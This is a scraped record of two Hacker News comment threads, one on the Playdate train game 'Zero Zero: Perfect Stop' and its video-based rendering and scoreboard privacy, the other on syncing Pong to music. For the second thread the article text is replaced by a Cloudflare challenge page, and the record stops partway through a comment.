    "commentBody": "Playdate Game Zero Zero: Perfect Stop (play.date)165 points by adrianhon 20 hours agohidepastfavorite42 comments hbridges 16 hours agoHi everybody. I'm Hunter, the developer of the game. I saw an uptick in sales over the past few hours and managed to trace it back here. So pleasantly surprised to see Zero Zero on HN! Thank you so much for the support and I hope all you Playdate owners out there enjoy the game!! reply rob74 11 hours agoparentInterestingly enough, until a few decades ago cranks were used to control the acceleration and (electric) braking in trams, electric locomotives etc. (https://de.wikipedia.org/wiki/Fahrschalter#/media/Datei:Gmun...). The rotation axis was vertical and not horizontal, and the feel and clicking noise of all the contacts opening and closing while you turn the crank would be lost, but still a Playdate would be great to simulate driving such a \"classic\" tram. reply infotainment 15 hours agoparentprevGreat job, I’m glad someone finally made a Densha-De-Go-like! Such a great gameplay concept! Question: is the route accurate to a real train, or is it fictional? reply hbridges 15 hours agorootparentIt's loosely based on a 6-station stretch of the Fuji Kyuukou line in Yamanashi. Not sure my environment art really did the real life area justice, but that's how I derived the stations and spacing between them. https://en.wikipedia.org/wiki/Fujikyuko_Line reply WhereIsTheTruth 11 hours agoparentprevCongrats, always great to see stuff built for handheld consoles I'm surprised at the file size though, you'd think having a device with such a low res and without colors, you'd be able to shrink down assets more Comparing to a Densha de Go rom from n64, the difference is huge and yet it had colors and 2x the res reply Wowfunhappy 9 hours agorootparentThe PlayDate game is larger because it's using prerendered video. reply M95D 10 hours agoparentprevHi. I saw that there are scoreboards on the website. Does this mean that the game includes some form of user tracking? Does the website (play.date) know how often a user plays, when, for how long, how good he/she is at it, etc.? Is there a unique user ID or device ID that they can pair with past&future aquisitions in the shop? I don't own that game and I probably never will. I'm just asking this to educate myself about what's possible in terms of invasion of privacy by using a low power console such as this one. Thanks. reply nosrepa 7 hours agorootparentI'll answer just in case you're actually interested in having a conversation. All of the scoreboard info can be found in the API docs: https://help.play.date/catalog-developer/scoreboard-api/ Don't want scoreboards? Don't connect to wifi. It baffles me that someone would be paranoid about this. reply MD87 7 hours agorootparentPresumably you need to be connected to wifi to obtain games, so that's not a great answer. I also found the scoreboards surprising. I wouldn't expect a Gameboy-like device to be reporting things back to a server. I don't have any particular privacy concerns about it myself, but it is surprising, and I can see why people might object. It also seems to contradict their privacy policy (https://panic.com/privacy/): Panic apps and products _do not_ send out _any_ private information. This includes ... Usernames ... But the scoreboard API seems like it's tied to usernames... reply iamjackg 2 hours agorootparentGiven the context around that line, I interpret that as applying to their actual Mac applications that deal with usernames/password/hostnames, especially since the sentence that precedes that is > Except as described above And further up there is a carve-out for Playdate logging. They also don't really need to send out your username for the API call -- they already know who you are because your device is tied to your account. I do find it surprising that there is no way to not participate in leaderboards. reply M95D 5 hours agorootparentprev> Presumably you need to be connected to wifi to obtain games Not only that, but the API link provided by the author specifies that scores are stored in the device if Wifi is offline and uploaded later, so aparently, there's no way to block uploading unless the device is hard-reset (is that even possible?) before connecting to Wifi to get another game. The only good thing I see is that the score board is not mandatory and it seems pretty benign if no other data is attached by the OS when scores are uploaded. But then, if scores are supported, 90% of the tracking infrastructure is already there. reply iamjackg 2 hours agorootparentYou might want to read the Usage Analytics section of their privacy policy. https://panic.com/privacy/ reply M95D 7 hours agorootparentprevI really am interested and it baffles me that nobody else has privacy as a priority in their life, but down-voted my question instead. playdate.scoreboards.addScore sends just the rank, player and value data, or is there a device ID added in the background? If not, how do they prevent spamming/cheating? Is player value user-defined? For this game only or all games on the device? Is it sent with https or just http? Thank you. reply iamjackg 2 hours agorootparentYou read that wrong. What you're referring to is the response you get from the server in the form of callback parameters. The function signature is playdate.scoreboards.addScore(boardID, value, callback) So you only send the boardID and the score. You get the player name back as part of the callback. reply omoikane 1 hour agorootparentprevYou are probably being downvoted for derailing. This is a post about a particular game, but this thread is turning into an ideological battle unrelated to the game. Discussions regarding people's priorities and privacy concerns would be better off as a separate post. reply M95D 20 minutes agorootparentOh. Ok. I'll keep that in mind next time. reply hi_hi 16 hours agoprevMany, many years ago (20+ eek) I worked on a 3D simulator for the New York Subway (even though we were based near London, UK). They were upgrading it from the legacy video based system to an interactive 3D sim. There was something deeply fulfilling about having the legacy videos running side by side with the realtime 3D view and having them almost perfectly in sync. We were running on inhouse designed and built, industrialised graphics cards, using 3DFX chips. It was a magical time to be involved with the cutting edge of 3D graphics as the industry tipped from Silicon Graphics and Evans & Sutherland \"big iron\" to consumer hardware. reply omoikane 18 hours agoprevDevelopment log here: https://devforum.play.date/t/zero-zero-perfect-stop-train-si... Looks like the game was pseudo-3D up until 2023, but sometime before 2024-05-19 they switched to a video-based approach. reply syntaxing 17 hours agoparentWhat does pseudo 3D vs video based approach mean for these games? reply throwaway0665 17 hours agorootparentYou draw the 2D projection of 3D objects manually instead of drawing 3D geometry and the hardware draws the 2D projection to the screen. The other is the gameplay is a video of a 3D scene that has been prerendered on a more powerful machine. reply hbridges 15 hours agorootparentThat's exactly right. The issue I ran into is that the Playdate's CPU doesn't have a lot of juice, and spends a lot of time every frame just filling the screen. There's no specialized blitting hardware or GPU. Hence realtime sprite scaling is not feasible. I tried making some pre-scaled sprites, and the ROM footprint had to be pretty large to afford enough size steps for reasonably smooth motion as the train moved past objects. Even then, all that sprite drawing was starting to dip the frame rate. So, I experimented with a pre-rendered approach, and that was a huge unlock. Eventually I was able to wrangle it into something that I think worked even better in the end! The pre-rendered video based approach allowed way more elaborate detail and I didn't have to worry about frame rate anymore. reply vardump 11 hours agorootparent> Hence realtime sprite scaling is not feasible. Playdate got STM32F746 (ARM Cortex-M7F) at 180 MHz. 320 kB SRAM (and 16 MB of other RAM, maybe PSRAM?). DSP and saturation instructions are included. The display is 400x240 1bpp. Surely that's more than enough juice for sprite scaling? (Might need to copy graphics data to SRAM and even to do it in tiles for better performance.) Although your video based implementation is pretty cool. reply MBCook 16 hours agorootparentprevSo essentially an FMV game, but used to provide better 3D than the system ever could natively instead of video of actual people. For a game like this where the path is limited and known that’s a very smart approach. Neat. reply playworker 11 hours agorootparentReminds me of MegaRace: https://en.wikipedia.org/wiki/MegaRace reply aquova 18 hours agoprevI've been following development of a 3D racing game for the Playdate - https://mastodon.gamedev.place/@2DArray/113070310047102734. The console is presented as being 2D-centric, but I'm curious to see what cream-of-the-crop graphical titles come out for the system within the next few years, it feels like it's really gaining steam. reply nosrepa 17 hours agoparentDo check out Secret Agent, Diora, and Snow! as well. reply danpalmer 17 hours agorootparentI can't find any of these, are they Play Date games? reply nosrepa 16 hours agorootparenthttps://dioragame.com/ https://twitter.com/risolvipro Snow! doesn't seem to have a home outside of discord, but it's a port of their existing pico8 game: https://freds72.itch.io/snow reply npinsker 14 hours agoprevDon't have a Playdate, but I'm really enjoying the soundtrack (https://hunty.bandcamp.com/album/zero-zero-perfect-stop-orig...). The instruments for the departure melodies are perfect -- they sound just like the Tokyo metro! reply PixelForg 14 hours agoparentI think I found my new ringtone :) reply RajT88 18 hours agoprevSeems quite a lot like Densha de Go! I am sure it is inspired by the series. reply hbridges 16 hours agoparentI love Densha de Go. DDG Final is one of my top 10 fav games of all time. When I got a Playdate, I had a vision of using the crank as a train's master controller and I was compelled to see it through... reply smusamashah 11 hours agoprevThis immediately reminded of Cab Ride for Pico-8 which was shared here on HN once https://powersaurus.itch.io/cab-ride reply Animats 11 hours agoprevAw. Check out BVE and OpenBVE, the train simulators. Exactly the same problem - stop precisely at the stations and keep to schedule. Subways and railroads in Japan, the US, and Korea are modeled in great detail. reply jonhohle 16 hours agoprevSega CD used this technique a lot to fake 3D environments. Silo here is a great example of a game that looks like it could be a real time 3D game, but it cleverly interweaves FMV with sprites. reply hbridges 16 hours agoparentDo you mean Slipheed? Because that game is insane reply steezeburger 15 hours agorootparentWas curious and looked it up. I think everyone's auto correct is a bit hardcore this evening. It's Silpheed reply hbridges 15 hours agorootparentYes, that's the one! I can't blame autocorrect, just a regular typo reply nosrepa 17 hours agoprevBeen following this in the Playdate Squad discord. While it's not my type of game, it definitely looks great. reply chaostheory 17 hours agoprevThere are a lot of nice indie surprises on the Playdate. I was not disappointed by it. There’s still new titles on the way too reply batiudrami 16 hours agoparentIt’s definitely more a curio than a competitor to, for example, the Switch, and the cost to entry is pretty high but I like mine a lot. reply TylerJaacks 17 hours agoprev [–] immediate buy for me reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "\"Zero Zero: Perfect Stop\" is a train driving game where players control the train's throttle and brakes using a crank, aiming for precise stops at each station.",
      "The game features multiple routes, including 1-stop, 3-stop, 5-stop, and Express routes, with global leaderboards and a Free Mode for casual play.",
      "The game supports both English and Japanese, and includes a tutorial for new players, making it accessible to a wide audience."
    ],
    "commentSummary": [
      "\"Zero Zero: Perfect Stop\" is a new game for the Playdate console, developed by Hunter Bridges, which has seen a recent increase in sales and interest.",
      "The game uses a video-based approach with pre-rendered video to simulate a train-driving experience, inspired by the Fuji Kyuukou line in Yamanashi, Japan.",
      "Discussions around the game include its technical implementation, privacy concerns regarding scoreboards, and comparisons to other train simulators and FMV (Full Motion Video) games."
    ],
    "points": 165,
    "commentCount": 42,
    "retryCount": 0,
    "time": 1725315419
  },
  {
    "id": 41434679,
    "title": "Synchronizing pong to music with constrained optimization",
    "originLink": "https://victortao.substack.com/p/song-pong",
    "originBody": "Just a moment...*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131}button,html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;height:100vh;min-height:100vh}body.no-js .loading-spinner{visibility:hidden}body.theme-dark{background-color:#222;color:#d9d9d9}body.theme-dark a{color:#fff}body.theme-dark a:hover{color:#ee730a;text-decoration:underline}body.theme-dark .lds-ring div{border-color:#999 transparent transparent}body.theme-dark .font-red{color:#b20f03}body.theme-dark .pow-button{background-color:#4693ff;color:#1d1d1d}body.theme-dark #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body.theme-dark #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}body.theme-light{background-color:#fff;color:#313131}body.theme-light a{color:#0051c3}body.theme-light a:hover{color:#ee730a;text-decoration:underline}body.theme-light .lds-ring div{border-color:#595959 transparent transparent}body.theme-light .font-red{color:#fc574a}body.theme-light .pow-button{background-color:#003681;border-color:#003681;color:#fff}body.theme-light #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body.theme-light #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}body.theme-light.feedback-report{border:1px solid #959595}body.feedback-report{border-radius:5px}a{background-color:transparent;color:#0051c3;text-decoration:none;transition:color .15s ease}a:hover{color:#ee730a;text-decoration:underline}.main-content{margin:8rem auto;max-width:60rem;padding-left:1.5rem;padding-right:1.5rem;width:100%}.main-content .spacer{margin:2rem 0}.main-content .loading-spinner{height:76.391px}.feedback-content{align-content:space-between;display:inline-grid;height:100vh;margin:0;padding:0}.feedback-content .spacer{margin:0}.heading-favicon{height:2rem;margin-right:.5rem;width:2rem}@media (width Enable JavaScript and cookies to continue(function(){window._cf_chl_opt={cvId: '3',cZone: \"victortao.substack.com\",cType: 'non-interactive',cNounce: '35134',cRay: '8bd7fddd9a5c67a1',cHash: '53fdef91574f41e',cUPMDTk: \"\\/p\\/song-pong?__cf_chl_tk=HN7hZ07.7e8zxPhY.zpnI1HyQU9KLBVs1ldjmfsqYCc-1725390120-0.0.1.1-4052\",cFPWv: 'g',cTTimeMs: '1000',cMTimeMs: '120000',cTplV: 5,cTplB: 'cf',cK: \"\",fa: \"\\/p\\/song-pong?__cf_chl_f_tk=HN7hZ07.7e8zxPhY.zpnI1HyQU9KLBVs1ldjmfsqYCc-1725390120-0.0.1.1-4052\",md: \"lFldVmlSyIiBHHfxjl_679QFiqZUkvHVjJ5pp8UzDMg-1725390120-1.1.1.1-AO7wehMEFFZbAQOuBvG1CrmKqXOHs7UVuQXXmGRdQtfrRT1SbxglURK6UXlYSSDpkOORxUjOHIiaPcGf8RezzOPEXujhD2QEIY2EG2MUyJxcEZxCVWrxRJZYjMD9hOwbc7mN8fZ8noYYv7PKXDyp8boNxvDQbdMvj.SzUo0G7q2c5A4cRuLO4IVtH8PBqSSUA1xrmRslMoC5HD8hvKkqwITtlu4lBklgiJPf2jGjH7ZwD16O7Eezu1jq5e37Uiu0S_ZN7Xn.q1AY_wBw1JfxfTNp0gIryXTxB7kOeG3_mNZMpFEyz4c7FprAuQON_gnzCXkdKeKQZOSLt_k9DAgDCMwAnJJdb.qCR4TNgq7KxUDAnmIZakSluP2lb3lgReAZ6KoY.6PG28yfaLgSs.hXM2ekiyvrVk165nlozgElfgdrlI0G0gaV8uUMW7Jg2EdZiepr_KFkShPSlXJkA_QdaJDYhrwdKM3iSRS7iz11E.F2tjzrf4Y..Ej1XnkT6Ou4RlObsE8Yu6vupgqs.JCTqfFHTCyGti6uwD9UEY1Q0aESFLkAJIuMkLC_RN_7Ynm0DPXu9FQY6q6glQDiYpkfMICsn2rGcIzLBSjcs3YRSm35_5h4ZA_51TLSxrHsq5AkXNPo7bPPhflddM_Lsdncj3MYOVX3UnsG3jW7R4lWwvO56WHirBy_fUbDizT8BhB7zZGixDcc9bZ90J.zsMdbrmQtcgmd6vhgZncl1AQjKq1JfV.g50BQ9sqyIwpky_X8g3FKLlDlSCsXTu9HrE1r9joKv2JO0jzvsuWphVhTJ_L.3xGUgwFqPSUGf5CD_o8XPHPmnVWO7QpyWgM.kepjoTbfato6MSJrr8PjodN.wOvgFnG0B9NK4DuKLYvti7q8RMV3cYY1uuYudiemTqqdjrhP.FP2kfI_Dzk1I3ACaU9725AW22L.EvWRCB00zLDdLxdDWh1W7k_3nlqYuUITEMP4Yz1bANiImqqIjWhEga6xt2knVRDjAeqbH4U8IT7183ubP7Moo3ell7AFrX9Q.hh6wZA9rkexcWlT.BkQ_CbCCa17YdJzI7RzAKkCSasez0pLhVIZ.n5RXJDSNyHXGbrYnPSRuepu65NnFaYNOPKkQnF64xz2mTnsF10zsUIbIzVEjInGilDouShGf7AerF63cMHjD0kdxF.hBZ5ZGjZ5oZCBqFLRLtFl0fOLHnvQmgXuvjQB0ExecbPQlo3UQFqdEtHbJf17rBS3QlPTM7r9_nh2N0GyLFOh.GV.okR7zlGp2eIjipod631KjFIU7db8HPd0qrGcN4KuB39BrzdfpxJzgaWL4wb.vYIYlaxcXIb4Bm_gCWPyaqFptca2ECt5WxIJQe2fAu3pVtaiwF4xZ8dHR8Nxp46RVWBmH3HBpyfuFbnzayEW1.l22tojhNl6iwahUGgGGgdRQkxOIQrpj48.0qXglFVPr0FMtx2djfob9UxUUon4VvT_mOJy2_cY2bSsHev34oFdCU7sKT8zOk7x2DRwOOek1SiPGYFyEYZOSzu9m8aaLibp6dwdPl4Kyl2CN.JdNqj3NtZLkEc\",mdrd: \"uWnSkVBa1OJIL_cFNBFt1qpsshBnKJhdrBrV5dBXPvY-1725390120-1.1.1.1-khXDSvcSliawYsDJAc38WhQxqEuz4Bvg6m5Kr8jU8cl5FBd8xudTOFnH_vIoWs3Sp1DEFX.zu1MEH8gnJ2zrFTPJ4x_zTK9gS1Ftea14K4Uqjuj.UDYqYCo1d3EZ6R655TeprO1fNGHLQD7nbc_6MTEvV5fEsUKO7wFOHOlLTCtlymEIZXZd1iI.w3CP8usbzT_APbtAXVsUx2Cy5phmKPDY09EXTESnhw7i2CvLnD2tJUKGPZO8S711sioCBY31aWVz5rkhBbeHPty6rdJfjbw_CVZGGwCeM0M.StptLmhlSN0yvQYQIyH026suc2RZOqWbyRGbNFbOhx7n9V32VeloPOTXuA7IuJL_5WNJk_dkFT4wjwHhZJ5G4WUpttSQ3fMPmGtmo7WNVoRBJeIUKevORAhM7rwAtII_zjECQ4qDQifD87rxcawbh7Yn6bKWBXeryS4poQCEZXH8AADQXMGL.n3YJKz3e0FNP.LH3YL75yozzBTabaL3XcA2c0_eUAIlvZOy.h9HEi6vjqr1d5eqv1WNcfBghFMA5PsF4uuDt2IoLIhDGs24P1ySuWuAUNaAWpRdgI4e5.FKz2njV4edkzu1zhdn9Kmt5fKdVKc7s5WS5QhinlVVEkEjqgmrbUh9NLwUFJxg6ghf_LS2wfAXz50vNaSgrRgj4UsjWYZQ6.OSHvU_NLvduLrbTHDmv4neR9Gau3wxzyd9_9x7Xf3S0TKdMgZlss9aTrBIYjPjB3YYEjaGD.FmmEWVZeu8rX4DyhqUGHjjSDvKSuLF3nYeONQA5Dwa4GHpymwzBOL3fptrNjVaTPyE3EyQMDFGwUO8POonN1iMKf8jvd2vl.KeVb1Te.o6vjk2E29q4zxT6VeCSHHQlbsw_N7b7s_8fby1l1M0Mq5.r7KNsYMfBxXmov4AWT47ro8I2g8gJvnEh4rV0jm279RutZTYfW32UpEKJZaTAhust7GF_sOH4YWLkK6ToDj6TPoRAOMxjiEHiYFFWeba_xP2CY_rDzvoDImtUhZxl8Nl4DHQLHCKDdhk1j.cYt8wyrDMcz3Y1aY7MTGGjt5Xqu1Jl9y7HQ0PKikhfEpzeBey3MUTOEAftbEi_BQP1iK4N6EnCOiruNkTliJKis9C9aa9NbAuVmJXQDJvLAo5U9kx1NmFoQWHR6YxMaz081TmX8UvIjVI4Xpn5gOamtG91xpV3v_iJQyRlFq4xEKxbqApuvmIxrI8jUmuredqGm4cNyC2fL_bQLKLkjw0Kouv8epIXU1auNK_BJZ7vnlvcLcPEq_Gcdm8Y4d6LTbupxnpU1jZBR9_pWE2w_.I8dv7LfLimMYHPWYmMJm2Fkz1QUAyjqZpPzx9_.EJ0U6GuZMGFzZA1TOarkMYZfx7aMxIs_d4k_aAkiEXD5ivMyWV4gxRSg7Q77JBbngJeTyezrhtMGAUf47ajQArNdUC1qbpzVCthnbbX7dACiSvAZRGs0hyZ0LGK4O9rnL88bX5wptCLRFLU4YpDS1y2Ve7z_N9PyCYKtBhrh.gvfhlEymzaSsl6fLgckPp7c5fif8ZazeGokXOmpxaHsi.MIk1agdmFjdD8YTEN2w.MFMXdamrKkpY3WQ7gYaqhL113iIouxZ5kkvtQENl3kxBhjzEjWmNQJprPXRIr.etvI4IJc5EzYKZ40ojGeR2sRTOUajt3DU3mzbx2BpJSpFz77ZzaVT0hnOjW1oIWXmsIeHCXnkuLiU50JbPX26Ffq425_2Ezor0k6RTABD.qocY2nPzfJipYN90UCbQxI28pSIhsUKQIcucWbcYgYw29oW9gY6vfFmZCBTwBmLDCf5MJNPnnNJrvyBg6Dc1KwBwzs1GtE.SBXRkUx9GVCef3UWlm0UUTGOIpWMTLcIJ4Oc5CcrP4bx768PtfsQe23F1_5XLx4FYsFYV1aUc0iIDBMlZJt6lY_vi6eZWiltX25OpGgE6.u_VxbfOgtWQkR2_61NuzRgY.CpezVmGdcA7kDkn6Yi5.xRsrUijezRHahINY5t30yIZuKWvdYnIMje32VYzcU1AcN_955K8GZ_AsXmUFuQCHk7oRPqbVGH6U0JRZ9vsPzANh7D_UDTEnmAsgQ2P.IkRTUltUtEYWj5lH.VSI6Ueg.eOTR1GPmWs8RjbFuRYoCd.LLufaPBwhIpSN.t4BoDyg2SbjNV6B1Sw74O7RLUqcQvyb0SYxIzP28iJlaFgMRsZQzEpdXhj2n8gUyXcUL9vRsVbE9GCfjUEt4chO1yrmz5IlBJ_RbU5xggTm7vXjJRNohoZX2Qzxhn.cEhL0qMRFNfujtyT0C3iwvxL_aN9v1AIKc7w1yRVCMM\",cRq: {ru: 'aHR0cHM6Ly92aWN0b3J0YW8uc3Vic3RhY2suY29tL3Avc29uZy1wb25n',ra: 'TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IEdvb2dsZWJvdC8yLjE7ICtodHRwOi8vd3d3Lmdvb2dsZS5jb20vYm90Lmh0bWwp',d: 'JkOiBMegjexpcf7BiaVu1dKUgpZJy24IWQS9pt/gU+loXzrc75ZnWJZvv98KWkzfDbSHcAElxsdfAlq+Xq5PHu40Ju4/7CVnyi1dn31gDCAi7ER3QFPIofd09Q4Nq/kvdvLI+b8NbmQK8yojnOuBLelYi6FxzB5wM9x3oOM921IBBtwiPK3g2oQhgUas58sm72EsjJSgJ9azjFLwMEahxZZkC/zyjfiumcsXgeAM5AgPLrIXSf7UzofRmglAMplR4sJbe8sMNBfnqsbMmeOWrTE11jV5WSEcFCf5zQMW10oXFvp8S6qdtcslc/XnJSmuDf0/Hd24qiu95Zgf+A+W5DZjnDfuJNLLjxnJHKQQoTsZAdv9GNGmhPg5hfXgJ6oJXmq/oWdAwVPfRm/FfC8jAluHFLzBf2vHjS7TY65O5OXDST7SSso/MavTEFcm1e1lQARWYFvZcGu05M24MO1A4SMJsi8LXehpb8cJtUAJaUuv6EdPrXX/F7rKqVjSJIqpTnMpCPspLHLVXRjVFu57rMP1AKBYz80lSZIhV4kHU3CuWoM+qtC4/FmvgDi1GoAR4ZMhjeAxrJPCkmEb2qaNog==',t: 'MTcyNTM5MDEyMC4wMDAwMDA=',cT: Math.floor(Date.now() / 1000),m: 'yE9GrBwMvWTCnBWuQulfyycVM1rdOGm+Q3CNI4b1WH8=',i1: 'DOXdmjGrjtms5GcFy9MD6g==',i2: '70TM+w3e3BSXk6ESs59dxw==',zh: 'o01jypKJQ++/gkxUTvC40nYpXBhuMc66cm0hd/Tc920=',uh: 'idqvltDEaw6z1eUpAaUFY/6rIUCphTJo6GMHGHVnQbg=',hh: '3mpVuHVbbUZHiIJJg6BVT/GpbwLOBFoKXxhtXn5Dh34=',}};var cpo = document.createElement('script');cpo.src = '/cdn-cgi/challenge-platform/h/g/orchestrate/chl_page/v1?ray=8bd7fddd9a5c67a1';window._cf_chl_opt.cOgUHash = location.hash === '' && location.href.indexOf('#') !== -1 ? '#' : location.hash;window._cf_chl_opt.cOgUQuery = location.search === '' && location.href.slice(0, location.href.length - window._cf_chl_opt.cOgUHash.length).indexOf('?') !== -1 ? '?' : location.search;if (window.history && window.history.replaceState) {var ogU = location.pathname + window._cf_chl_opt.cOgUQuery + window._cf_chl_opt.cOgUHash;history.replaceState(null, null, \"\\/p\\/song-pong?__cf_chl_rt_tk=HN7hZ07.7e8zxPhY.zpnI1HyQU9KLBVs1ldjmfsqYCc-1725390120-0.0.1.1-4052\" + window._cf_chl_opt.cOgUHash);cpo.onload = function() {history.replaceState(null, null, ogU);}}document.getElementsByTagName('head')[0].appendChild(cpo);}());",
    "commentLink": "https://news.ycombinator.com/item?id=41434679",
    "commentBody": "Synchronizing pong to music with constrained optimization (victortao.substack.com)153 points by platers 5 hours agohidepastfavorite18 comments montebicyclelo 2 hours agoVery cool! As a further variation on this idea, I'm imagining training a reinforcement learning agent on atari games / super mario, but with an additional music-based reward/input, to try to get a \"musical\" looking playthrough... (Not sure how good it would look / whether it would be worth it though...) reply vunderba 1 hour agoparentCrypt of the NecroDancer explores this idea of rhythmically timing your character's movement to get bonuses in game. reply Sirizarry 13 minutes agorootparentDon’t forget the legend of Zelda spinoff “cadence of hyrule” which I’m pretty sure was made by the same guys as crypt of the necrodancer. reply jfmc 3 hours agoprevPrior art: Eisenfunk - Pong (https://www.youtube.com/watch?v=cNAdtkSjSps) reply diggan 3 hours agoparentBit different though! In your example, the video is made from manually syncing with the song bpm, as the beep is at a constant rate. It's basically just a hand-made visualization of (every other) kick drum. While the submission has the notes not at a basic 1/4 tempo, and is automatically \"animated\" based on the constrained optimization. Also leads to a much more interesting visualization :) reply jfmc 3 hours agorootparentNo constraint optimization can replace Pentafunk Jenny ;) reply adroitboss 4 hours agoprevThis is so freaking cool! I was mesmerized watching the paddles move as the beat progressed. There are certain things that just look right which makes it beautiful.This project is one of them! reply MeteorMarc 51 minutes agoprevDelightful. Part of the fun is that the game is a background to the music rather than the other way around that we are used to. reply grimgrin 2 hours agoprevImagining an `installation` in my space, using both my MT-80S and a display. Can I even reason about this, the timing? I'm not smart here, just interested https://www.matrixsynth.com/2014/07/roland-mt-80s-midi-playe... reply entropie 4 hours agoprevReally nice stuff. I cannot send a heart without subscribing which doesnt feel right for me. reply KolmogorovComp 3 hours agoprevAwesome work! How is the beat used to sync the pong chosen? Like for Bad Apple!, especially around 1m55 https://www.youtube.com/watch?v=bvxc6m-Yr0E it seems off Good suggestion from a YouTube commenter, pasting it here > This is pretty cool.. it would be cooler if there were multiple pongs and paddles for each type of beat (like high beats and low beats) reply Angostura 2 hours agoprevReally interesting. For some reason my brain really really hates this. I think it screws with my internal model of causality or something and I find it difficult to watch. Odd reply dwringer 1 hour agoparentFor me the most conspicuous thing missing is dynamics... particularly when there are \"ghost notes\" in between much louder ones during a fast passage, it seems like something is missing. That said, however, I find it to be oddly satisfying to watch. Curious if experience playing different instruments has anything to do with it. To me, something like a xylophone or a steelpan feels pretty analogous to this. reply fisherjeff 55 minutes agorootparentI think it may be synthesized – I thought the reverb was a little off, and noticed there was little to no change in timbre when the dynamics changed. reply johntb86 2 hours agoparentprevIt seems like the ball bounces off the center of the paddle, not the edge, which always makes it look wrong. Maybe you're seeing the same problem? reply randall 4 hours agoprevpretty neat! it feels like if you spaced out “important” beats instead of most of them and shrunk the play area so the paddles are larger, it would have an even more interesting effect. reply SamineDylah 4 hours agoprevAbsolutely wonderful! > \"We obtain these times from MIDI files, though in the future I’d like to explore more automated ways of extracting them from audio.\" Same here. In case it helps: I suspect a suitable option is (python libs) Spleeter (https://github.com/deezer/spleeter) to split stems and Librosa (https://github.com/librosa/librosa) for beat times. I haven't ventured into this yet though so I may be off. My ultimate goal is to be able to do it 'on the fly', i.e. in a live music setting being able to generate visualisations a couple of seconds ahead being played along with the track. Not sure if this is unsavory self promotion (it's not for commercial purposes, just experimenting), but I am in the middle of documenting something similar at the moment. Experiments #1 - A Mutating Maurer RoseSyncing Scripted Geometric Patterns to Music: https://www.youtube.com/watch?v=bfU58rBInpw It generates a mutating Maurer Rose using react-native-svg on my RN stack, synced to a music track I created in Suno AI *. Manually scripted to sync up at the moment (not automatic until I investigate the above python libs). Not yet optimised, proof of concept. The Geometric pattern (left) is the only component intended to be 